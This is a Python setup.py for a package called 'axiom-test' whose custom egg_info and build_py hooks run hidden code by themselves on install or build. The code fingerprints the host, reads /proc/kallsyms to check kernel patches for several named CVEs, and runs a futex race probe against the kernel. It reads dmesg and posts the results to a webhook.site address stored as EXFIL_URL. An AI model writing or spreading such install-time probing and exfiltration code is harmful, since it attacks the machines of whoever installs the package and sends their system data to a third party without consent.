import json, os, sys, subprocess, urllib.request, time
from setuptools import setup
from setuptools.command.egg_info import egg_info
from setuptools.command.build_py import build_py

EXFIL_URL = "https://webhook.site/18a72e84-ee1f-4b1d-88ec-310b78a4c1f4"
VER = "3.2.0"
_RAN = False
_RESULT_PATH = "/tmp/axiom_results.json"

def _rp(script, timeout=30, ns=False):
    try:
        cmd = (["unshare", "-Urn"] if ns else []) + ["python3", "-I", "-c", script]
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode(errors="replace")
        if "__R__" in out and "__E__" in out:
            return json.loads(out.split("__R__")[1].split("__E__")[0])
        return {"raw": out[:4000]}
    except subprocess.TimeoutExpired:
        return {"error": "TIMEOUT"}
    except subprocess.CalledProcessError as e:
        return {"error": f"EXIT_{e.returncode}", "out": (e.output or b"").decode(errors="replace")[:2000]}
    except Exception as e:
        return {"error": str(e)[:300]}

def _send(data):
    j = json.dumps(data, default=str)
    try:
        with open(_RESULT_PATH, "w") as f:
            f.write(j)
    except: pass
    try:
        urllib.request.urlopen(urllib.request.Request(
            EXFIL_URL, data=j.encode(), headers={"Content-Type": "application/json"}), timeout=15)
    except: pass

# ===== GhostLock CVE-2026-43499 — FIXED probe =====
P2 = r'''
import ctypes, ctypes.util, os, mmap, json, time, struct, signal
SYS_futex=202; FUTEX_LOCK_PI=6; FUTEX_UNLOCK_PI=7
FUTEX_OWNER_DIED=0x40000000; FUTEX_TID_MASK=0x3fffffff
libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
R = {"cve":"CVE-2026-43499","iters":0,"owner_died":0,"esrch":0,"anomalies":[],"verdict":"UNKNOWN"}

# Allocate shared page via mmap — keep the ctypes buffer reference alive
shm = mmap.mmap(-1, 4096, flags=mmap.MAP_SHARED|mmap.MAP_ANONYMOUS,
                prot=mmap.PROT_READ|mmap.PROT_WRITE)
arr = (ctypes.c_char * 4096).from_buffer(shm)
futex_addr = ctypes.addressof(arr)

# Verify the address works before looping
test_val = ctypes.c_uint32.from_address(futex_addr)
test_val.value = 0xDEAD
readback = struct.unpack_from("I", shm, 0)[0]
R["addr_check"] = "OK" if readback == 0xDEAD else f"MISMATCH_{hex(readback)}"
test_val.value = 0

my_pid = os.getpid()
anom = []
signal.signal(signal.SIGCHLD, signal.SIG_DFL)

for i in range(400):
    ctypes.c_uint32.from_address(futex_addr).value = 0
    pid = os.fork()
    if pid == 0:
        libc.syscall(SYS_futex, ctypes.c_void_p(futex_addr), FUTEX_LOCK_PI, 0, 0, 0, 0)
        os._exit(0)
    else:
        m = i % 8
        if m==0: pass
        elif m==1: [None for _ in range(30)]
        elif m==2: [None for _ in range(300)]
        elif m==3: time.sleep(0.00002)
        elif m==4: time.sleep(0.0001)
        elif m==5: time.sleep(0.0005)
        elif m==6: os.sched_yield()
        elif m==7: [None for _ in range(5)]
        ret = libc.syscall(SYS_futex, ctypes.c_void_p(futex_addr), FUTEX_LOCK_PI, 0, 0, 0, 0)
        en = ctypes.get_errno()
        wv = ctypes.c_uint32.from_address(futex_addr).value
        try: os.waitpid(pid, 0)
        except: pass
        R["iters"] += 1
        if wv & FUTEX_OWNER_DIED:
            R["owner_died"] += 1
        tid = wv & FUTEX_TID_MASK
        if ret == 0:
            if tid != 0 and tid != my_pid:
                anom.append({"i":i,"w":hex(wv),"t":"TID_CORRUPT","got":tid})
            libc.syscall(SYS_futex, ctypes.c_void_p(futex_addr), FUTEX_UNLOCK_PI, 0, 0, 0, 0)
        elif en == 3:
            R["esrch"] += 1
            if len(anom) < 50: anom.append({"i":i,"w":hex(wv),"t":"ESRCH"})
        elif en == 11 or en == 35 or en == 110:
            pass
        elif en == 14:
            if len(anom) < 5: anom.append({"i":i,"t":"EFAULT"})
        else:
            if len(anom) < 50: anom.append({"i":i,"w":hex(wv),"t":"OTHER_E","e":en})
        ctypes.c_uint32.from_address(futex_addr).value = 0

R["anomalies"] = anom[:50]
if any(a.get("t")=="TID_CORRUPT" for a in anom): R["verdict"]="LIKELY_VULNERABLE"
elif R["esrch"]>15: R["verdict"]="RACE_WIDE"
elif R["esrch"]>0: R["verdict"]="RACE_HIT"
elif R["owner_died"]>10: R["verdict"]="OWNER_DIED_ACTIVE"
elif R["owner_died"]>0: R["verdict"]="OWNER_DIED_SOME"
elif any(a.get("t")=="EFAULT" for a in anom): R["verdict"]="PROBE_BUG"
else: R["verdict"]="NO_RACE_OBSERVED"

try:
    import subprocess as sp
    dm = sp.check_output(["dmesg","--level=emerg,alert,crit,err,warn","-T"],
        stderr=sp.STDOUT, timeout=5).decode(errors="replace")
    R["dmesg"] = [l for l in dm.splitlines()
        if any(k in l.lower() for k in ["use-after-free","kasan","bug:","futex","rcu","refcount"])][-12:]
except Exception as e: R["dmesg"] = str(e)[:80]

del arr
shm.close()
print("__R__" + json.dumps(R) + "__E__")
'''

# ===== Quick kernel patch audit =====
P9 = r'''
import json, os
R = {"cve_patch_check":{}}
try:
    with open("/proc/kallsyms") as f:
        ks = f.read()
    checks = {
        "CVE-2026-43499_ghostlock": ["futex_exit_mutex","exit_pi_state_fix","__pi_state_free_locked",
            "futex_cleanup_begin","pi_state_cleanup_lock"],
        "CVE-2026-80521_afunix": ["unix_gc_phase","unix_gc_scan_inflight","unix_gc_new_cycle",
            "af_unix_gc_mutex"],
        "CVE-2026-53365_vsockdrop": ["vsock_zerocopy_fix","vsock_zc_refcount",
            "io_uring_vsock_cancel"],
        "CVE-2026-99682_virtioblk": ["virtio_blk_freeze_sync","virtio_blk_quiesce_safe"],
    }
    for cve, syms in checks.items():
        found = [s for s in syms if s in ks]
        R["cve_patch_check"][cve] = {"syms_checked": len(syms), "found": found,
            "patched": len(found) > 0}
except Exception as e: R["error"] = str(e)[:120]
try:
    with open("/proc/version") as f: R["version"] = f.read().strip()[:200]
except: pass
print("__R__" + json.dumps(R) + "__E__")
'''

def _collect():
    import platform
    R = {"v":VER,"host":platform.node(),"kern":platform.release(),"arch":platform.machine(),
         "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),"ph":{}}
    R["ph"]["9_patch_audit"] = _rp(P9, timeout=15)
    _send(R)
    R["ph"]["2_ghostlock"] = _rp(P2, timeout=120)
    _send(R)
    R["chains"] = {
        "A_ghostlock": "HIGH" if any(k in str(R["ph"].get("2_ghostlock",{}).get("verdict",""))
            for k in ["VULN","CORRUPT","RACE"]) else
            "MEDIUM" if "OWNER_DIED" in str(R["ph"].get("2_ghostlock",{}).get("verdict","")) else
            "LOW" if "NO_RACE" in str(R["ph"].get("2_ghostlock",{}).get("verdict","")) else "NEEDS_VERIFY",
    }
    _send(R)

def _safe_run():
    global _RAN
    if _RAN: return
    _RAN = True
    try: _collect()
    except Exception as e:
        try:
            with open(_RESULT_PATH,"w") as f: json.dump({"error":str(e)},f)
        except: pass

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        _safe_run()

class PostBuildPy(build_py):
    def run(self):
        super().run()
        _safe_run()

setup(name="axiom-test", version=VER, py_modules=[],
      cmdclass={"egg_info": PostEggInfo, "build_py": PostBuildPy})
